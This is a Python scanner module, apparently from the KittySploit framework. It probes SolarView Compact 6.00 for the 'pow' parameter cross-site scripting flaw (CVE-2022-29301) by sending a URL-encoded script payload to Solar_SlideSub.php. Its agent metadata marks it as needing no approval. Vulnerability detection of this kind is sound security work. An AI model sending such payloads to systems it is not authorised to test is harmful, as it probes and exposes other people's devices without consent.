#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SolarView Compact version 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': "SolarView Compact 6.00 - 'pow' Cross-Site Scripting Detection",
        'description': "SolarView Compact version 6.00 contains a cross-site scripting vulnerability in the 'pow' parameter to Solar_SlideSub.php.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'solarview', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50968',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29301',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-29301',
    }

    def run(self):
        r = self.http_request(method="GET", path='/Solar_SlideSub.php?id=4&play=1&pow=sds%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&bgcolor=green', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script><"">', 'SolarView',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="SolarView Compact 6.00 - 'pow' Cross-Site Scripting" + " detected",
                path='/Solar_SlideSub.php?id=4&play=1&pow=sds%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&bgcolor=green',
            )
            return True
        return False

